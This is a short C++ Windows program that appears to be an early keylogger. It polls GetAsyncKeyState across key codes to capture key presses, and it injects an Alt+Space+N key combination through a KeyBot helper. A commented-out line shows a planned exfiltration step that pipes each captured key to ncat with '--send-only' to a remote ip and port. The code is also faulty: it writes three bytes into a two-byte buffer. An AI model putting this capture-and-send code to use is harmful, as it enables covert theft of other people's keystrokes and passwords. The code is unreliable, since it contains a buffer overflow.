#define WIN32_LEAN_AND_MEAN
#define _WIN32_WINNT 0x0500

//define required

#include "class/io.h"

#include <windows.h>
#include "class/keybot.h"

int i = 1;
int getKey(){

    while(true){
        if(GetAsyncKeyState(i) == -32768){
            //stringstream txt ;
            //cout << i << "\n";
            //txt << "echo " << i << " | " << "ncat " << ip << " " << port << " --send-only";
            int cp = i;
            i++;
			char c = cp;
			cout << cp << endl;
			system("pause");
            return cp;
        }
        i++;
        if(i > 90){
            i=1;
            Sleep(1);
        }
    }
}

main(){
	KeyBot bot;
	
	char* c = new char[2];
	
	c[0] = 18;
	c[1] = 32;
	c[2] = 78;
	
	bot.KeyDown(c,3);
	Sleep(100);
	bot.KeyUp(c,3);
}